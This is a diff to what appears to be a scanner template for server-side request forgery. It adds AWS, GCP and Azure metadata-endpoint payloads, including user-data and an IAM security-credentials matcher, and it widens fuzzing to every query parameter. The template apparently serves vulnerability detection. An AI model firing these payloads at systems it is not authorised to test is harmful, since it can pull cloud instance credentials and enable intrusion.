@@ -10,14 +10,18 @@ http:
     path:
       - "{{BaseURL}}"
 
+    headers:
+      Metadata-Flavor: "Google"
+
     payloads:
       ssrf_targets:
+        - "http://169.254.169.254/latest/meta-data/"
         - "http://169.254.169.254/latest/meta-data/instance-id"
         - "http://metadata.google.internal/computeMetadata/v1/instance/id"
+        - "http://169.254.169.254/latest/user-data"
 
     fuzzing:
       - part: query
-        keys: ["url", "target", "redirect"]
         type: replace
         fuzz:
           - "{{ssrf_targets}}"
@@ -25,13 +29,21 @@ http:
     matchers-condition: or
     matchers:
       - type: regex
-        name: aws-confirmed
-        regex:
-          - "^i-[a-f0-9]{8,17}$" # Actual AWS Instance ID format
+        name: aws-metadata
         part: body
+        regex:
+          - "ami-id"
+          - "instance-id"
+          - "iam/security-credentials/"
 
       - type: word
-        name: gcp-confirmed
+        name: gcp-metadata
+        part: header
         words:
           - "Metadata-Flavor: Google"
-        part: header
+
+      - type: word
+        name: azure-metadata
+        part: body
+        words:
+          - "microsoft.compute"
